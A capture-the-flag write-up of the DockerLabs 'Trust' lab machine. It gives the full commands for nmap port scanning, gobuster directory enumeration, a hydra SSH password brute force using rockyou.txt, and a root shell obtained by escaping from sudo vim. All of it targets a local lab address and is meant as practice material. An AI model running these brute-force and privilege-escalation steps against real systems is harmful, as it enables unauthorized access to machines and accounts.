---
title: Trust Writeup - DockerLabs
date: 2024-06-25
categories:
    - Writeups
    - DockerLabs
tags:
    - Linux
    - DockerLabs
    - CTF
    - Very Easy
img_path: /assets/img/commons/trust/
image: trust.png
---

Hello!

In this write-up, we will dive into the **DockerLabs** machine [Trust](https://mega.nz/file/wD9BgLDR#784mjg4xwoolyyKMqdGLk1_YntbJLItJ7RFRx9A69ZE).

Let's go!

## Active recognition
---

As a first step, we will execute the `ping` command to verify that the target machine is active:

```bash
ping -c 1 172.18.0.2
```


## Port scanning
---

Next, we run a scan with `nmap` to identify open ports on the target machine.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv 172.18.0.2 -oG allPorts
```

The only open ports that we see are 80 (HTTP server) and 22 (SSH), we can see more information of the services by executing:

```bash
nmap -sCV 22,80 172.18.0.2 -oN targeted -oX targetedXML
```

![nmap](nmapScan.png)


## Exploitation
---
We don't see nothing on the web so we are going to enumerate directories in order to find hidden paths:

```bash
gobuster -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
```

```txt
Report produced on Tue Jun 25 19:24:11 CEST 2024
--------------------------------

http://172.18.0.2:80
--------------------------------
Directories found during testing:

Dirs found with a 403 response:

/icons/
/icons/small/

Dirs found with a 200 response:

/


--------------------------------
Files found during testing:

Files found with a 200 responce:

/secret.php


--------------------------------
```

We find the url `/secret.php`. If we open it, we can see the following website:

![secret_path](secret-php.png)

We don't see anything interesting, except a possible username (**Mario**)

We can now try access to the machine via SSH as the user **Mario** by bruteforcing the user's password using _hydra_:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```

![hydra](hydra_result.png)

We have now access as the user Mario:

![user_access](userAccess.png)

<br>

## Privilege escalation
---

Now, as the user Mario, we are able to run the command `sudo -l` to try to find superuser processes that we can run as the user prod:

![sudo-l](privilege1.png)

We find that we can execute the `vim` tool as sudo.

We can simply access `vim` and type `:!/bin/bash` or we can directly obtain a shell by executing the command:

```bash
sudo vim -c ':!/bin/bash'
```

![sudo_access](privilege2.png)

In both ways we gain superuser access and we have the whole system committed.


> H4Ppy H4ck1ng!
